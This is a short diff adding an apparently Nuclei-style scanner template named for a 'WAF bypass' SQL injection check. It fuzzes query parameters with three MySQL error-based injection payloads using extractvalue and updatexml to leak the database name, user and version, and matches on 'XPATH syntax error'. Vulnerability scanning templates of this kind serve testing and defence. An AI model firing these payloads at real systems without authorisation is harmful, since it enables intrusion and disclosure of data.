@@ -1,0 +1,25 @@
+id: THENAWABX_FOUND_SQLI
+info:
+  name: 💉 Nawab-Validated-SQLi-WAF-Bypass 💉
+  author: thenawabx
+  severity: critical
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    payloads:
+      sqli_payloads:
+        - "1' AND (extractvalue(1,concat(0x7e,(SELECT database()),0x7e)))--"
+        - "1\" AND (extractvalue(1,concat(0x7e,(SELECT user()),0x7e)))--"
+        - "1' AND (updatexml(1,concat(0x7e,(SELECT version()),0x7e),1))--"
+    fuzzing:
+      - part: query
+        type: replace
+        fuzz:
+          - "{{sqli_payloads}}"
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "XPATH syntax error"
